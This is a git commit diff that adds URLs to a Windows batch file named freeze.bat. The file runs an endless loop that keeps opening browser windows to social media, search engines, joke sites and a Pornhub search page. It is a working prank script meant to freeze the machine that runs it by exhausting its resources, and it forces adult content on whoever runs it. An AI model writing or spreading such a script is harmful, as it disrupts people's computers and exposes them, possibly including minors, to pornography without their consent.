94b175f7c16e54458b14423768429961ee73f641
Oxide Dev <59166229+OxideDevX@users.noreply.github.com>
2021-06-05 11:16:50 +0300

    update files(add sites)

--- freeze.bat
+++ freeze.bat
@@ -1,4 +1,4 @@
-@echo off
+@echo off 
 :a
 start www.youtube.com
 start www.facebook.com
@@ -6,4 +6,10 @@ start www.google.com
 start www.instagram.com
 start www.udemy.com
 start www.dailymotion.com
+start yandex.ru
+start http://hackertyper.com/
+start https://findtheinvisiblecow.com/
+start http://www.haneke.net/
+start https://isitchristmas.com/
+start https://rt.pornhub.com/video/search?search=url%3D
 goto:a
